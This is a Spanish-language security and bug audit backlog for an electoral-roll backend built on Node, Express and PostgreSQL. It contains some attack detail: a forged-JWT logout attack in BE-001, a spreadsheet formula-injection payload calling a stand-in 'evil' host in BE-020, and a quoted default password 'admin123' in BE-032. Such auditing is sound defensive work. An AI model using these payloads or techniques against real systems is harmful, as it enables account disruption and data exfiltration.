# Backlog de auditoría de BACKEND

Auditoría exhaustiva del backend (Node 20 + Express + PostgreSQL/Supabase, monolito
modular por capas `routes → service → repository`) hecha antes de un release. Es
**diagnóstico**: nada de lo listado acá fue corregido todavía.

Alcance cubierto: `src/core/` (app, config, db, errors, estaticos, logger, migrations,
security/*), los 5 módulos de `src/modules/` (auth, auditoria, padron, comicio,
fiscales, listas), scripts operativos (`migrate.js`, `seed-usuarios.js`,
`api-snapshot.js`), `Dockerfile`/`docker-compose.yml`/`render.yaml`, y un inventario de
cobertura de `test/`. `npm audit` no reportó vulnerabilidades conocidas en las 123
dependencias (0 críticas/altas/medias/bajas).

No se repiten acá los puntos que `CLAUDE.md` ya documenta como reglas cumplidas y
verificadas (pool único inyectado, `process.env` sólo en `config.js`, errores lanzados
vía `errores.*`+`asyncHandler`, toda ruta con `requiresAuth`, escritura parcial con
`COALESCE`, control de concurrencia optimista por `version`, migraciones idempotentes,
el bug ya arreglado de `ComicioRepository.reemplazarVotos` leyendo por el pool dentro de
una transacción). Sí se reportan violaciones o repeticiones **nuevas** de esos mismos
patrones encontradas en otros lugares del código.

---

## Hallazgos

### BE-001 — `POST /api/auth/logout` no verifica la firma del JWT: cualquiera puede forzar el cierre de sesión de cualquier usuario

- **Categoría:** Seguridad
- **Severidad:** Crítica
- **Ubicación:** `src/modules/auth/routes.js:29-36` (ruta pública); `src/modules/auth/service.js:151-179`, línea 153 (`jwtHelper.decodificar(token)`); `src/core/security/jwt.js:62-65` (`decodificar` = `jwt.decode()`, sin verificar firma/issuer/audience); `src/modules/auth/repository.js:106-120` (`cerrarSesion`)
- **Descripción:** `logout()` usa `jwt.decode()` en vez de `jwt.verify()`. Un atacante puede fabricar un JWT con forma válida (tres segmentos base64url) y firma arbitraria, con `{ id: <id_de_víctima>, jti: "x" }` como payload, y mandarlo como `Authorization: Bearer <token-falso>`. El código lo acepta igual y ejecuta `cerrarSesion({ jti, userId: claims.id })`, que borra todos los `refresh_tokens` de la víctima, borra su `active_sessions`, invalida su caché en memoria y registra un evento `LOGOUT` en auditoría atribuido a ella con datos también controlados por el atacante.
- **Impacto:** Denegación de servicio dirigida y repetible contra cualquier usuario (los `id` son correlativos, triviales de enumerar), sin necesitar credenciales. Además contamina el log de auditoría con eventos `LOGOUT` falsos atribuidos a la víctima, rompiendo la garantía de atribución por usuario que `CLAUDE.md` marca como regla que no se rompe.
- **Sugerencia de solución:** Verificar la firma igual, tolerando sólo la expiración: `jwt.verify(token, config.jwt.secreto, { ...OPCIONES_COMUNES, ignoreExpiration: true })`, capturando `TokenExpiredError` como caso válido pero rechazando `JsonWebTokenError` sin tocar la base.

---

### BE-002 — Un nuevo login no invalida los refresh tokens anteriores: la "sesión única" se puede eludir con un token viejo

- **Categoría:** Seguridad
- **Severidad:** Crítica
- **Ubicación:** `src/modules/auth/repository.js:64-78` (`abrirSesion`, sólo hace `INSERT` de refresh token y upsert de `active_sessions`, nunca borra refresh tokens previos del usuario); comparar con `cerrarSesion` (`:106-120`), que sí borra todos los refresh tokens, pero sólo en logout explícito; `src/modules/auth/service.js:126-145` (`renovar`, acepta cualquier refresh token vigente sin chequear si corresponde a la sesión activa actual)
- **Descripción:** `active_sessions` tiene PK `user_id`, así que un nuevo login sí invalida el access token del dispositivo anterior. Pero `refresh_tokens` no tiene esa restricción: cada login agrega una fila sin borrar las anteriores. Si el Dispositivo A inicia sesión y luego el Dispositivo B inicia sesión (cerrando la sesión de A por diseño), el refresh token de A sigue siendo válido hasta que expire (7 días) o se use. `/api/auth/refresh` es público y no valida que el token pertenezca a la sesión vigente — el Dispositivo A puede llamar `/refresh` en cualquier momento dentro de esos 7 días y recuperar una sesión válida, **echando al Dispositivo B**, sin la contraseña.
- **Impacto:** Anula la garantía de "sesión única" y de atribución por usuario documentada como regla dura del proyecto. Un dispositivo/token perdido, robado u olvidado sin logout puede recuperar el control de la cuenta indefinidamente durante 7 días.
- **Sugerencia de solución:** En `abrirSesion`, borrar (`DELETE FROM refresh_tokens WHERE user_id = $1`) antes de insertar el nuevo, dentro de la misma transacción — igual que ya hace `cerrarSesion` en logout.

---

### BE-003 — `TRUST_PROXY` se pasa como string en vez de número, puede romper el arranque o el rate limiting por IP

- **Categoría:** Bug / Seguridad
- **Severidad:** Alta
- **Ubicación:** `src/core/config.js:129` (`trustProxy: process.env.TRUST_PROXY === undefined ? 1 : process.env.TRUST_PROXY`), usado en `src/core/app.js:68`
- **Descripción:** A diferencia de todas las demás variables numéricas del archivo (que pasan por `entero()`), ésta no convierte el valor. `.env.example:40` documenta `TRUST_PROXY=1`. Si está definida, el valor que llega a `app.set('trust proxy', ...)` es el string `"1"`, no el número `1`. Express trata un string en `trust proxy` como lista de IPs/CIDR/nombres reservados, no como cantidad de saltos — la conversión interna puede lanzar una excepción al arrancar, o en el mejor caso no confiar en ningún proxy.
- **Impacto:** Si lanza excepción, la app no arranca en el despliegue estándar documentado. Si no lanza pero no reconoce el hop-count, `req.ip` deja de reflejar la IP real del cliente detrás de Render, rompiendo el rate limiting por IP y los logs de acceso.
- **Sugerencia de solución:** `trustProxy: entero(process.env.TRUST_PROXY, 1)`.

---

### BE-004 — Rate limit global (1000 req/15min por IP, compartido entre todas las rutas) insuficiente contra fuerza bruta

- **Categoría:** Seguridad
- **Severidad:** Alta
- **Ubicación:** `src/core/app.js:135-145`, config en `src/core/config.js:138-142`
- **Descripción:** El único limitador está montado sobre todo `/api/` con `max: 1000` cada `ventanaMs` (default 15 min), compartido entre todas las rutas incluyendo login. No hay un limitador más estricto para login/recuperación de contraseña en la capa transversal. 1000 intentos/15min por IP (~1,1 req/s sostenido) es una ventana de fuerza bruta viable contra credenciales.
- **Impacto:** Brute-force o credential stuffing sin fricción real, agravado por BE-006 (sin rate limit específico en `/login`) y BE-007 (enumeración de usuarios por timing).
- **Sugerencia de solución:** Un `rateLimit` adicional, más estricto (5-10 intentos/15min por IP+usuario), aplicado puntualmente sobre login/recuperación, además del global.

---

### BE-005 — `POST /votantes` sobrescribe en silencio a un votante existente y siempre responde "creado"

- **Categoría:** Bug
- **Severidad:** Alta
- **Ubicación:** `src/modules/padron/routes.js:115-124`, `src/modules/padron/service.js:105-131` (`crearVotante`), `src/modules/padron/repository.js:141-162` (`insertarVotante`)
- **Descripción:** `insertarVotante` hace `INSERT ... ON CONFLICT (dni) DO UPDATE SET`, que reescribe todos los campos del votante sin chequear si el DNI ya existía. `crearVotante` pasa `tipo_ejemplar: null` incondicionalmente y `domicilio`/`circuito` como `''` si no vinieron. Si se manda un DNI ya cargado, el registro real se pisa parcialmente a blanco/null — sin `version`, sin 409, sin ningún control de concurrencia (a diferencia del resto del módulo). `routes.js:123` responde siempre 201 "Votante creado exitosamente" aunque en realidad haya sido un UPDATE destructivo.
- **Impacto:** Pérdida silenciosa de domicilio/circuito/tipo_ejemplar de un votante real, con auditoría que registra falsamente "CREAR_VOTANTE".
- **Sugerencia de solución:** Usar `INSERT ... ON CONFLICT (dni) DO NOTHING RETURNING *`; si no devuelve fila, lanzar un 409/400 explícito de "DNI ya existe" en vez de upsertear.

---

### BE-006 — Sin rate limiting específico en `/api/auth/login` ni lockout por cuenta

- **Categoría:** Seguridad
- **Severidad:** Alta
- **Ubicación:** módulo `src/modules/auth/routes.js` (ruta de login), sin limitador propio; único limitador es el global de BE-004
- **Descripción:** No existe un limitador dedicado a `/api/auth/login`, ni bloqueo (lockout) tras N intentos fallidos consecutivos sobre un mismo `username`. El único control es el global de toda la API (~66 intentos/min por IP), que no limita en absoluto un ataque distribuido ni dirigido a múltiples usuarios desde la misma IP.
- **Impacto:** Fuerza bruta / credential stuffing viable contra cuentas de operadores y administradores.
- **Sugerencia de solución:** Limitador con `keyGenerator` que combine IP + `username` del body, o contador de intentos fallidos por usuario con backoff.

---

### BE-007 — Enumeración de usuarios por canal de tiempo, pese a que el mensaje de error es idéntico

- **Categoría:** Seguridad
- **Severidad:** Alta
- **Ubicación:** `src/modules/auth/service.js:31-75` — cuando el usuario no existe (línea 35) se lanza el error sin llamar a `bcrypt.compare`; cuando existe pero la contraseña es incorrecta (líneas 62-75) sí se ejecuta `bcrypt.compare` con costo 12
- **Descripción:** El mensaje ("Credenciales inválidas") es igual en ambos casos, pero el tiempo de respuesta no: "usuario no existe" es casi instantáneo (una consulta indexada), "contraseña incorrecta" añade el costo de un `bcrypt.compare` factor 12 (decenas de ms). Esa diferencia es medible.
- **Impacto:** Permite enumerar usernames válidos por timing como paso previo a fuerza bruta dirigida.
- **Sugerencia de solución:** Ejecutar siempre un `bcrypt.compare` contra un hash dummy fijo cuando el usuario no existe, para igualar el tiempo de las dos rutas.

---

### BE-008 — El exportador de padrón en streaming no maneja errores de conexión a mitad de camino

- **Categoría:** Bug
- **Severidad:** Alta (incertidumbre: depende del comportamiento exacto de `asyncHandler`/`core/errors.js`, no revisado en este alcance)
- **Ubicación:** `src/modules/padron/exporter.js:69-104` (loop de lotes sin try/catch), `src/modules/padron/routes.js:296-311` (`exportarComo`)
- **Descripción:** Si la consulta de un lote lanza a mitad del loop (conexión caída, timeout), ya se enviaron headers y parte del body CSV vía `res.write`. El error se propaga hacia el manejador global, que presumiblemente intenta `res.status(...).json(...)` — imposible con headers ya enviados.
- **Impacto:** El cliente queda con un CSV truncado sin ningún indicio de error.
- **Sugerencia de solución:** Envolver el loop en try/catch; si falla habiendo ya escrito datos, llamar `res.destroy(error)` en vez de dejar que el error suba al handler genérico.

---

### BE-009 — Condición de carrera (TOCTOU) en la validación de doble solapamiento de fiscales

- **Categoría:** Bug / Seguridad (integridad de datos)
- **Severidad:** Alta
- **Ubicación:** `src/modules/fiscales/service.js:166-184` (`_validarSinSolapamiento`), `:101-121, 123-144` (`crearAsignacion`/`actualizarAsignacion`); `src/modules/fiscales/repository.js:75-98` (`solapaConMesa`/`solapaConFiscal`), `:102-109, 129-136`
- **Descripción:** El chequeo de solapamiento son dos `SELECT` y el `INSERT`/`UPDATE` posterior es una sentencia separada, sin transacción ni locking, y no hay restricción a nivel de base (`UNIQUE`/`EXCLUDE`) que impida el solapamiento. Dos requests concurrentes pueden pasar ambos el `SELECT` (aún no ven la fila del otro, READ COMMITTED) y ambos `INSERT` tienen éxito.
- **Impacto:** Rompe exactamente la invariante que `CLAUDE.md` documenta como garantizada ("una mesa no tiene dos fiscales a la vez, un fiscal no está en dos mesas a la vez"), con mayor probabilidad de ocurrir el día de la elección con varias personas cargando el calendario en simultáneo.
- **Sugerencia de solución:** Envolver check+insert en `db.transaccion` con `SELECT ... FOR UPDATE`, o agregar una restricción `EXCLUDE` a nivel de Postgres (`btree_gist`) para que la base rechace el solapamiento sin depender de la app.

---

### BE-010 — Eliminar un comicio o mesa borra en cascada votos y asignaciones de fiscales sin dejar rastro completo en auditoría

- **Categoría:** Bug / Mantenibilidad
- **Severidad:** Alta
- **Ubicación:** `src/modules/comicio/service.js:147-159` (`eliminarComicio`), `:227-239` (`eliminarMesa`); esquema: `comicio/migrations/001_esquema_comicio.sql:25` y `002_fuerzas_y_mesa_opcional.sql:28` (`ON DELETE CASCADE`), `fiscales/migrations/001_esquema_fiscales.sql:17` (ídem)
- **Descripción:** `eliminarComicio` sólo registra en auditoría la fila `comicios`; el `DELETE` dispara cascada sobre todas las mesas del comicio, que a su vez cascadea sobre `votos_fuerza` y `fiscal_asignaciones`, sin que nada de eso quede reflejado en el log de auditoría. Igual para `eliminarMesa`.
- **Impacto:** En un sistema electoral, perder la trazabilidad de qué votos/asignaciones desaparecieron junto con el comicio/mesa es un hueco de auditoría serio.
- **Sugerencia de solución:** Antes del `DELETE`, leer y adjuntar al payload de auditoría las mesas/votos/asignaciones dependientes, o bloquear el borrado (409) si hay datos dependientes salvo un flag explícito de "forzar".

---

### BE-011 — `PUT /api/listas/:id` no es atómico entre metadata y candidatos, contradice el requisito explícito del spec

- **Categoría:** Bug
- **Severidad:** Alta
- **Ubicación:** `src/modules/listas/service.js:142-143` (llama a `actualizarDatos` y luego a `reemplazarCandidatos` como dos operaciones separadas); `src/modules/listas/repository.js:70-78` (`actualizarDatos`, UPDATE suelto sin transacción propia) y `:81-89` (`reemplazarCandidatos`, sí transaccional)
- **Descripción:** `specs/017-armado-listas/spec.md:71-79` exige explícitamente que reemplazar la lista completa de candidatos en el PUT sea una única transacción, para evitar un corte a mitad de camino. La sub-operación de candidatos es atómica, pero `actualizarDatos` y `reemplazarCandidatos` son dos transacciones independientes. Si la primera confirma y la segunda falla, la lista queda con metadata nueva y candidatos viejos.
- **Impacto:** Un PUT que falla puede dejar una lista en un estado a medio camino que nunca debería producirse, sin indicio para el usuario de que la operación fue parcial.
- **Sugerencia de solución:** Envolver ambas escrituras en una sola `db.transaccion` en el repository, con un único método que reciba el `cliente` y haga ambas cosas antes del COMMIT.

---

### BE-012 — `jwt.verify` no restringe explícitamente el algoritmo esperado

- **Categoría:** Seguridad
- **Severidad:** Media
- **Ubicación:** `src/core/security/jwt.js:52-60` (`OPCIONES_COMUNES`, líneas 17-20, sólo trae `issuer`/`audience`, no `algorithms`)
- **Descripción:** `jsonwebtoken` es razonablemente seguro por defecto con clave simétrica, pero es buena práctica fijar `algorithms: ['HS256']` explícitamente para eliminar cualquier ambigüedad ante un token manipulado que declare otro algoritmo.
- **Impacto:** Bajo en la práctica dado el uso actual (sólo HMAC), pero es defensa en profundidad barata.
- **Sugerencia de solución:** Agregar `algorithms: ['HS256']` a `OPCIONES_COMUNES` y a la firma en `firmar()`.

---

### BE-013 — Los stack traces se descartan de los logs internos en producción, incluso para errores no manejados

- **Categoría:** Mantenibilidad / Operación
- **Severidad:** Media
- **Ubicación:** `src/core/logger.js:34-36`
- **Descripción:** En producción, cualquier `logger.error(msg, error)` —incluyendo el manejador de errores no reconocidos y `uncaughtException`/`unhandledRejection` en `server.js:128,132`— pierde el `stack`. Es correcto para lo que va al cliente, pero acá se aplica también a lo que va a stdout/logs internos, que no es sensible para el equipo operando el sistema.
- **Impacto:** Ante un crash en producción (que además tumba el proceso vía `apagar('uncaughtException')`), el log no dice en qué línea ocurrió el error, dificultando el diagnóstico justo cuando más se necesita.
- **Sugerencia de solución:** Incluir siempre el `stack` en el log estructurado interno; mantener la restricción sólo en el cuerpo de la respuesta HTTP.

---

### BE-014 — Sin advisory lock en el runner de migraciones

- **Categoría:** Bug / Mantenibilidad
- **Severidad:** Media
- **Ubicación:** `src/core/migrations.js:55-104` (`migrarModulo`), `:125-139` (`migrarTodo`)
- **Descripción:** No hay `pg_advisory_lock` que impida que dos instancias de `npm run migrate` corriendo en paralelo (dos deploys simultáneos, un CI reintentando) lean el mismo estado "no aplicada" e intenten aplicar la misma migración a la vez.
- **Impacto:** En el flujo documentado (paso manual de deploy) el riesgo es bajo, pero no hay protección ante ejecución concurrente accidental, y nada garantiza que toda migración futura sea idempotente si la carrera ocurre.
- **Sugerencia de solución:** Envolver con `pg_try_advisory_lock` al inicio y liberarlo al final.

---

### BE-015 — Permisos `admin.users`/`admin.roles` declarados pero nunca verificados en ningún endpoint

- **Categoría:** Inconsistencia / Seguridad
- **Severidad:** Media
- **Ubicación:** `src/modules/auth/module.js:29` (declara `admin.users`, `admin.roles`, `admin.system`); `src/modules/auth/routes.js:102,106,110,125,133,155` (todas las rutas de administración de usuarios usan `requireAdmin`, rol hardcodeado, nunca `requirePermission('admin.users'/'admin.roles')`)
- **Descripción:** El esquema de permisos permite en teoría asignar `admin.users`/`admin.roles` a un rol custom para delegar gestión de usuarios, pero en la práctica esos permisos no tienen ningún punto de aplicación: el gate real es "sos rol administrador" o nada.
- **Impacto:** Diseño de permisos inconsistente con lo implementado; falsa sensación de control granular vía la tabla de roles/permisos.
- **Sugerencia de solución:** Reemplazar `requireAdmin` por `requirePermission(...)` en esas rutas, o quitar esos permisos de la lista declarada si la gestión de usuarios debe ser exclusiva del rol administrador.

---

### BE-016 — El refresh de sesión (`/api/auth/refresh`) no se audita

- **Categoría:** Mantenibilidad / Auditoría
- **Severidad:** Media
- **Ubicación:** `src/modules/auth/service.js:126-145` (`renovar`) — a diferencia de `login`/`logout`, no hay ninguna llamada a `auditoria.registrar(...)`
- **Descripción:** Renovar token abre una sesión nueva e invalida la anterior del usuario, exactamente igual que un login, pero ese evento no queda en el log de auditoría.
- **Impacto:** Un vector real de "sesión que reemplaza a otra" (ver BE-002) queda invisible en auditoría, dificultando la investigación forense si se explota.
- **Sugerencia de solución:** Registrar un evento (`operacion: 'REFRESH'`) igual que en login.

---

### BE-017 — `PUT /api/users/:id` no valida el tipo de `activo`, a diferencia de `PATCH /:id/status`

- **Categoría:** Bug / Inconsistencia
- **Severidad:** Media
- **Ubicación:** `src/modules/auth/routes.js:125-131` (`PUT /:id`, sin chequeo de tipo) vs. `:133-139` (`PATCH /:id/status`, sí exige boolean); `src/modules/auth/repository.js:180-197`
- **Descripción:** Si se manda `{ activo: "false" }` (string) en el `PUT`, no hay validación previa; según cómo el driver serialice el parámetro contra una columna boolean, puede terminar en un 500 no controlado o comportamiento no evidente.
- **Impacto:** Bug potencial silencioso o 500; incoherencia de contrato entre dos endpoints del mismo recurso.
- **Sugerencia de solución:** Unificar la validación de `activo` en un único punto de servicio, no repetida por ruta.

---

### BE-018 — Política de contraseñas débil (mínimo 6 caracteres, sin complejidad ni longitud máxima)

- **Categoría:** Seguridad
- **Severidad:** Media
- **Ubicación:** `src/modules/auth/users.service.js:17` (`LARGO_MINIMO_PASSWORD = 6`), `:162-166` (`validarPassword`, único chequeo: longitud mínima)
- **Descripción:** No hay techo de longitud, requisito de complejidad, ni verificación contra contraseñas comunes. El propio comentario explica que 6 es intencional para no romper el frontend actual, decisión de producto válida pero baja para un sistema con datos electorales y cuentas administrativas.
- **Impacto:** Cuentas, incluidas administrativas, protegidas por contraseñas triviales de 6 caracteres.
- **Sugerencia de solución:** Subir el mínimo (8-10) coordinando frontend y backend a la vez.

---

### BE-019 — Sin longitud máxima en `password` antes de hashear (vector de costo de CPU)

- **Categoría:** Seguridad / Performance
- **Severidad:** Media
- **Ubicación:** `src/modules/auth/routes.js:18-27` (login, sólo valida truthy); `src/modules/auth/users.service.js:162-166` (sin máximo); `bcryptjs` puro JS con costo 12 (`service.js:9,16`)
- **Descripción:** Nada impide mandar un `password` de varios MB (acotado sólo por el límite global de body, 10MB). Combinado con `bcryptjs` (implementación JS, más costosa que el binding nativo) en el hilo principal y sin límite de intentos efectivo (BE-006), es una superficie de agotamiento de CPU en un servidor chico — justo el tipo de endpoint donde el costo de servidor importa más.
- **Impacto:** Degradación de servicio por CPU en un VPS con recursos limitados.
- **Sugerencia de solución:** Límite explícito de longitud máxima de password (p. ej. 128 caracteres) antes de llamar a `bcrypt.compare`.

---

### BE-020 — CSV Injection / Formula Injection en la exportación de padrón

- **Categoría:** Seguridad
- **Severidad:** Media
- **Ubicación:** `src/modules/padron/exporter.js:24-29` (`escapar`), campos libres `observacion`/`telefono` en `service.js:144-170`
- **Descripción:** `escapar()` sólo neutraliza `"`, `,`, `\n`, `\r`; no antepone `'` cuando un valor empieza con `=`, `+`, `-` o `@`. `observacion`/`telefono` son texto libre cargado por cualquier usuario con permiso de relevamiento. Un valor como `=HYPERLINK("http://evil/"&A1)` viaja intacto al CSV exportado.
- **Impacto:** Vector clásico (CWE-1236) contra quien abre el export en Excel, típicamente un administrador.
- **Sugerencia de solución:** Si el valor empieza con `=+-@`, anteponer `'` antes de aplicar el resto del escapado.

---

### BE-021 — Teléfono relevado visible con sólo el permiso de lectura del padrón

- **Categoría:** Seguridad
- **Severidad:** Media (incertidumbre: depende de la matriz de roles real, no verificada en este alcance)
- **Ubicación:** `src/modules/padron/routes.js:320-331` (`formatearFila`), ruta protegida sólo con `padron.view` en `routes.js:86`
- **Descripción:** El teléfono cargado por el relevamiento se devuelve en `GET /votantes` a cualquiera con `padron.view`, sin exigir el permiso `padron.relevamiento` que sí protege escribirlo.
- **Impacto:** Depende de si `padron.view` ya se considera de confianza equivalente a `padron.relevamiento` — a confirmar contra la migración de roles/permisos.
- **Sugerencia de solución:** Confirmar la intención y, si no es la deseada, ocultar el teléfono a quien sólo tenga `padron.view`.

---

### BE-022 — Sin validación de formato/longitud de DNI en ningún endpoint del padrón

- **Categoría:** Inconsistencia
- **Severidad:** Media
- **Ubicación:** `src/modules/padron/routes.js:118` (`POST /votantes`, sólo chequea truthy), y los `:dni` de path param en `:126-134, 149-159, 221-250`
- **Descripción:** El backend acepta cualquier string no vacío como DNI. La columna es `VARCHAR(20)`; un valor inválido llega hasta el `INSERT`/`UPDATE` y falla ahí con un error crudo de Postgres en vez de un 400 controlado.
- **Impacto:** Errores 500 no controlados por datos de entrada triviales de validar antes.
- **Sugerencia de solución:** Agregar un patrón de validación temprana en `routes.js`, igual que ya se hace con `opcionPolitica`.

---

### BE-023 — Una fila con campo demasiado largo aborta la importación de padrón completa, en vez de descartarse

- **Categoría:** Bug
- **Severidad:** Media
- **Ubicación:** `src/modules/padron/importer.js`, `filaATsv` (:68-97); definición de `tmp_import_votantes` (:159-169) con límites `VARCHAR(20)`/`VARCHAR(100)`/`VARCHAR(50)`
- **Descripción:** `filaATsv` descarta filas por DNI/apellido/nombre/año faltante o inválido, pero no valida longitud contra los límites de columna. Un DNI de 21 caracteres o un apellido de 101 hace fallar el `COPY` dentro de la transacción, y por el diseño correcto de atomicidad se pierde la importación entera, sin decir cuál fila.
- **Impacto:** Una importación de miles de filas puede fallar por completo por un solo dato sucio, sin mensaje que indique cuál.
- **Sugerencia de solución:** Truncar o descartar (sumando a `descartadas`) filas cuyos campos excedan los límites de columna, antes del `Transform`.

---

### BE-024 — Permisos `padron.export`/`resultados.export` declarados pero nunca aplicados en las rutas

- **Categoría:** Mantenibilidad / Config de seguridad
- **Severidad:** Media
- **Ubicación:** `src/modules/padron/module.js:23` (declara `padron.export`/`resultados.export`); `src/modules/padron/routes.js:313-314` (las rutas de export usan `requireAdmin`, no esos permisos)
- **Descripción:** Un administrador que asigne `padron.export` a un rol esperando habilitar `/exportar-padron` se encuentra con que no alcanza — el gate real exige el rol admin completo. Los dos permisos quedan sin ningún efecto real.
- **Impacto:** Confusión en la administración de roles, falsa sensación de control granular.
- **Sugerencia de solución:** Cambiar las rutas de export a `requirePermission(...)`, o quitar esos permisos de la lista declarada y documentar que el export es sólo-admin.

---

### BE-025 — Sin manejo explícito de encoding en la importación de CSV del padrón

- **Categoría:** Bug
- **Severidad:** Media (incertidumbre: no se verificó con qué encoding exporta realmente la fuente del CSV)
- **Ubicación:** `src/modules/padron/importer.js` — `fs.createReadStream(rutaArchivo)` sin `encoding` explícito, seguido de `csv-parser` (asume UTF-8)
- **Descripción:** El propio comentario del código reconoce que un encabezado puede llegar mal codificado, pero no se aplica ninguna detección/conversión de encoding sobre los valores (apellido, nombre, domicilio). Si el CSV real viene en Latin-1/Windows-1252, apellidos con tildes o "ñ" se importan corruptos de forma silenciosa.
- **Impacto:** Corrupción silenciosa de datos de identidad en el padrón.
- **Sugerencia de solución:** Si se confirma que la fuente no es siempre UTF-8, agregar detección o forzar conversión con `iconv-lite` antes del parseo.

---

### BE-026 — Condición de carrera (TOCTOU) en la validación de solapamiento de rango de mesas de un comicio

- **Categoría:** Bug
- **Severidad:** Media
- **Ubicación:** `src/modules/comicio/service.js:242-264` (`_validarRango`), `:174-198, 200-225`; `src/modules/comicio/repository.js:179-194` (`mesasSolapadas`), `:196-203, 231-238`
- **Descripción:** Mismo patrón check-then-insert que BE-009, sin transacción ni lock; nada en el esquema impide dos mesas con rangos de DNI cruzados.
- **Impacto:** Menor que BE-009 porque normalmente lo carga un solo admin de forma secuencial, pero la ventana de carrera existe si dos personas cargan mesas del mismo comicio a la vez.
- **Sugerencia de solución:** Mismo tratamiento que BE-009.

---

### BE-027 — Eliminar un fiscal con asignaciones activas borra su calendario sin aviso

- **Categoría:** Bug
- **Severidad:** Media
- **Ubicación:** `src/modules/fiscales/service.js:85-97` (`eliminar`); `fiscal_asignaciones.fiscal_id` con `ON DELETE CASCADE` (`migrations/001_esquema_fiscales.sql:18`)
- **Descripción:** No se chequea si el fiscal tiene asignaciones vigentes antes de borrar; la cascada borra silenciosamente todo su calendario.
- **Impacto:** Un borrado accidental el día de la elección deja mesas sin cobertura sin ningún error ni registro de qué se perdió.
- **Sugerencia de solución:** Verificar asignaciones del fiscal antes de eliminar y bloquear con 409 si existen, o incluirlas en el payload de auditoría.

---

### BE-028 — Falta validar `fuerzaId` duplicado al cargar votos de una mesa

- **Categoría:** Bug
- **Severidad:** Media
- **Ubicación:** `src/modules/comicio/service.js:268-295` (`cargarVotos`); `src/modules/comicio/repository.js:247-266` (`reemplazarVotos`); PK compuesta `(mesa_id, fuerza_id)` en `002_fuerzas_y_mesa_opcional.sql:31`
- **Descripción:** El service valida que cada `fuerzaId` pertenezca al comicio y que la cantidad sea válida, pero nunca valida que no haya `fuerzaId` repetidos en el array. Un duplicado hace que el segundo `INSERT` viole la PK compuesta, traducido a un 409 genérico sin indicar cuál fuerza ni que el problema es un duplicado del payload.
- **Impacto:** Error confuso para el usuario, difícil de diagnosticar desde el mensaje.
- **Sugerencia de solución:** Validar unicidad de `fuerzaId` en el service antes de llamar al repositorio, con mensaje claro.

---

### BE-029 — Posible falta de índice compuesto sobre `padron.votantes` para los cálculos de rango de mesa

- **Categoría:** Performance
- **Severidad:** Media (incertidumbre: no se verificaron las migraciones de `padron/` para confirmar si el índice ya existe)
- **Ubicación:** `src/modules/comicio/repository.js:213-229` (`mesasDeComicio`, subconsulta correlacionada por mesa), `:285-322` (`metricas`), `:162-171, 179-194`
- **Descripción:** Todas estas queries comparan tuplas `(apellido, nombre, dni)` contra `padron.votantes`, algunas una vez por mesa. No se encontró, dentro de las migraciones de `comicio/`/`fiscales/`, un índice compuesto sobre esa tupla — no se revisaron las migraciones de `padron/` para confirmar si ya existe ahí.
- **Impacto:** Si no existe, cada query hace un scan secuencial y el costo escala con `mesas × tamaño del padrón`. Al ritmo actual (~5.500 filas) probablemente no duele todavía.
- **Sugerencia de solución:** Confirmar si `padron/migrations` ya define el índice; si no, agregarlo antes de que el padrón crezca.

---

### BE-030 — Falta cobertura de test para el tope de notas (`TOPE_NOTAS`) en Listas

- **Categoría:** Mantenibilidad
- **Severidad:** Media
- **Ubicación:** `test/listas.test.js` — importa y testea `TOPE_CANDIDATOS`/`TOPE_SUPLENTES` pero no `TOPE_NOTAS`; validación en `service.js:88-90`
- **Descripción:** La validación de notas > 2000 caracteres queda sin test que confirme el 400.
- **Sugerencia de solución:** Agregar un test análogo a los de tope de candidatos/suplentes para notas.

---

### BE-031 — Sin tests a nivel ruta (HTTP) para `PUT`/`DELETE` de listas

- **Categoría:** Mantenibilidad
- **Severidad:** Media
- **Ubicación:** `test/listas.test.js` — hay tests de ruta con permisos para GET y POST, pero no un test real de `PUT`/`DELETE /api/listas/:id` a través del router
- **Descripción:** No hay verificación de que `requirePermission('listas.edit')` gatee esos verbos en la ruta real (aunque `routes.js` lo declara correctamente), ni un test end-to-end de un PUT exitoso.
- **Sugerencia de solución:** Sumar al menos "PUT con listas.edit actualiza y responde 200" y "DELETE con sólo listas.view da 403".

---

### BE-032 — `scripts/api-snapshot.js` trae una credencial por defecto insegura hardcodeada

- **Categoría:** Seguridad
- **Severidad:** Media
- **Ubicación:** `scripts/api-snapshot.js:43` (`const PASS = args.pass || process.env.SNAPSHOT_PASS || 'admin123';`)
- **Descripción:** `admin123` es exactamente la contraseña insegura que `seed-usuarios.js` describe como el problema que vino a resolver (credenciales fijas del sistema viejo). Reaparece como fallback en un script operativo versionado.
- **Impacto:** Si un entorno por descuido heredara esa contraseña, queda documentado en texto plano en el repo cuál probar primero.
- **Sugerencia de solución:** Quitar el default y exigir `--pass`/`SNAPSHOT_USER`/`SNAPSHOT_PASS` explícitos, fallando con mensaje claro si faltan.

---

### BE-033 — Orden de migraciones depende de disciplina de nombres, sin validación

- **Categoría:** Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `src/core/migrations.js:35-37` (`.sort()` lexicográfico sobre nombres de archivo)
- **Descripción:** Funciona mientras todos los prefijos tengan el mismo ancho (`001`, `002`...), pero no hay validación que lo garantice: un archivo `10_x.sql` ordenaría antes que `9_x.sql` si algún módulo dejara de usar cero-padding de 3 dígitos.
- **Sugerencia de solución:** Validar con regex el formato esperado del nombre de archivo y lanzar/advertir si no matchea.

---

### BE-034 — Orígenes CORS de `localhost` hardcodeados también en producción

- **Categoría:** Mantenibilidad / Seguridad menor
- **Severidad:** Baja
- **Ubicación:** `src/core/config.js:130-137` (`origenesCors`)
- **Descripción:** Los dos orígenes `localhost:3000`/`8080` quedan siempre en la whitelist de CORS, también en producción, sin condicionar a `!esProduccion`. Con `credentials: true`, es una superficie de ataque acotada pero innecesaria.
- **Sugerencia de solución:** Condicionar esos orígenes al entorno de desarrollo.

---

### BE-035 — `crossOriginEmbedderPolicy: false` sin justificación documentada

- **Categoría:** Mantenibilidad
- **Severidad:** Baja
- **Ubicación:** `src/core/app.js:104`
- **Descripción:** Todas las demás decisiones de Helmet en ese bloque llevan comentario explicando el motivo; ésta no. Deshabilitar COEP no parece necesario dado que `public/` no depende de terceros.
- **Sugerencia de solución:** Documentar el motivo o remover la excepción y dejar el default de Helmet.

---

### BE-036 — Límite de body de 10MB aplicado global, antes de autenticación y de un rate limit específico

- **Categoría:** Performance / Seguridad
- **Severidad:** Baja
- **Ubicación:** `src/core/app.js:107-113` vs. `:135-145`
- **Descripción:** Un cliente no autenticado puede enviar bodies de hasta 10MB a cualquier endpoint JSON, incluido login, al ritmo del rate limit laxo (BE-004) — carga de parseo notable sin autenticarse, en un VPS chico.
